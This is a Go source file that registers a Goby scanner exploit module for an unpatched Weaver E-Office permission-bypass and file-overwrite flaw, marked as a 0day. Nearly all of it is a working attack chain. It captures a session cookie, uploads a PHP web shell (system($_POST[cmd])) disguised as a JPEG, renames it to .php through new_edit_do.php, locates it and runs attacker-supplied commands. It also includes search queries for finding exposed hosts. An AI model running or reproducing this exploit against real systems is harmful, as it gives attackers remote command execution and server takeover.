package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Weaver E-Office sample Bypass new_edit_do File Overwrite Bypass Vulnerability",
    "Description": "<p>E-office is a standard collaborative mobile office platform of Shanghai Weaver Network Technology Co., Ltd.</p><p>E-office has a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-10-31",
    "Author": "1243099890@qq.com",
    "FofaQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "GobyQuery": "((header=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"Server: eOffice\") && body!=\"Server: couchdb\") || banner=\"general/login/index.php\"",
    "Level": "2",
    "Impact": "<p>E-office has a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Set access policies and white list access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sample.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "setcookie|lastheader|regex|Set-Cookie: PHPSESSID=(.*?); path=/"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/inc/jquery/uploadify/uploadify.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary70AcDBrh15OE0Fd0",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundary70AcDBrh15OE0Fd0\nContent-Disposition: form-data; name=\"name\"\n\n1.jpg\n------WebKitFormBoundary70AcDBrh15OE0Fd0\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.jpg\"\nContent-Type: image/jpeg\n\n<?php echo md5(233);unlink(__FILE__);?>\n------WebKitFormBoundary70AcDBrh15OE0Fd0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastbody|regex|(?s)(.*)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/address/docenter/new_edit_do.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarybZ4wB2Sk3KHNDWnB"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A1\"\n\ntest\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A2\"\n\n男\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A25\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A5\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A8\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A10\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A10_name\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A9\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A13\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A4\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A3\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A17\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A18\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A19\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A20\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A21\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A14\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A22\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A23\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A24\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A26\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A16\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A15\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A27\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A6\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A7\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ATTACHMENT_PIC\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"type\"\n\nnew\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"f\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ADD_TYPE\"\n\n1\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"GROUP_ID\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ATTACHMENT_PIC_NAME\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/address/docenter/new_edit_do.php?type=edit&ATTACHMENT_PIC=D:/eoffice/webroot/attachment/{{{filename}}}/1.jpg&ATTACHMENT_PIC_NAME=.php&add_id=1",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A1\"\n\ntest\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A2\"\n\n男\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A25\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A5\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A8\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A10\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A10_name\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A9\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A13\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A4\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A3\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A17\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A18\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A19\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A20\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A21\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A14\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A22\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A23\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A24\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A26\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A16\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A15\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A27\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A6\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A7\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ATTACHMENT_PIC\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"type\"\n\nnew\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"f\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ADD_TYPE\"\n\n1\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"GROUP_ID\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ATTACHMENT_PIC_NAME\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/address/view/address_edit.php?add_id=1",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|<input type=\"hidden\" name=\"FRIST_IMAGE\" id=\"FRIST_IMAGE\" value=\"(.*?)\">"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "{{{file}}}",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e165421110ba03099a1c0393373c5b43",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sample.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "setcookie|lastbody|regex|Set-Cookie: PHPSESSID=(.*?); path=/"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/inc/jquery/uploadify/uploadify.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary70AcDBrh15OE0Fd0",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundary70AcDBrh15OE0Fd0\nContent-Disposition: form-data; name=\"name\"\n\n1.jpg\n------WebKitFormBoundary70AcDBrh15OE0Fd0\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"1.jpg\"\nContent-Type: image/jpeg\n\n<?php system($_POST[cmd]);unlink(__FILE__);?>\n------WebKitFormBoundary70AcDBrh15OE0Fd0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "filename|lastbody|regex|(?s)(.*)"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/address/docenter/new_edit_do.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarybZ4wB2Sk3KHNDWnB"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A1\"\n\ntest\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A2\"\n\n男\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A25\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A5\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A8\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A10\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A10_name\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A9\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A13\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A4\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A3\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A17\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A18\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A19\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A20\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A21\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A14\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A22\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A23\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A24\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A26\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A16\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A15\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A27\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A6\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"A7\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ATTACHMENT_PIC\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"type\"\n\nnew\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"f\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ADD_TYPE\"\n\n1\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"GROUP_ID\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB\nContent-Disposition: form-data; name=\"ATTACHMENT_PIC_NAME\"\n\n\n------WebKitFormBoundarybZ4wB2Sk3KHNDWnB--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/address/docenter/new_edit_do.php?type=edit&ATTACHMENT_PIC=D:/eoffice/webroot/attachment/{{{filename}}}/1.jpg&ATTACHMENT_PIC_NAME=.php&add_id=1",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/general/address/view/address_edit.php?add_id=1",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "file|lastbody|regex|<input type=\"hidden\" name=\"FRIST_IMAGE\" id=\"FRIST_IMAGE\" value=\"(.*?)\">"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "{{{file}}}",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass",
        "File Inclusion"
    ],
    "VulType": [
        "Permission Bypass",
        "File Inclusion"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office sample 权限绕过 new_edit_do 文件覆盖漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>e-office是上海泛微网络科技股份有限公司一款标准协同移动办公平台。</p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">e-office 存在权限绕过漏洞，攻击者可以绕过权限校验，上传</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">任意文件并覆盖，</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">获取服务器控制权限。</span></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">e-office 存在权限绕过漏洞，攻击者可以绕过权限校验，上传</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">任意文件并覆盖，</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">获取服务器控制权限。</span><br></p>",
            "VulType": [
                "权限绕过",
                "文件包含"
            ],
            "Tags": [
                "权限绕过",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Weaver E-Office sample Bypass new_edit_do File Overwrite Bypass Vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">E-office is a standard collaborative mobile office platform of Shanghai Weaver Network Technology Co., Ltd.</span><br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">E-office has&nbsp;</span><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.</span><br></span></p>",
            "Recommendation": "<p>1. The vulnerability has not been repaired officially. Please contact the manufacturer to repair the vulnerability: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a><br></p><p>2. Set access policies and white list access through security devices such as firewalls.<br></p><p>3. If it is not necessary, public network access to the system is prohibited.<br></p>",
            "Impact": "<p>E-office has&nbsp;<span style=\"color: rgb(0, 0, 0);\">a privilege bypass vulnerability. An attacker can bypass privilege verification and upload arbitrary files to obtain server control permissions.</span><br></p>",
            "VulType": [
                "Permission Bypass",
                "File Inclusion"
            ],
            "Tags": [
                "Permission Bypass",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
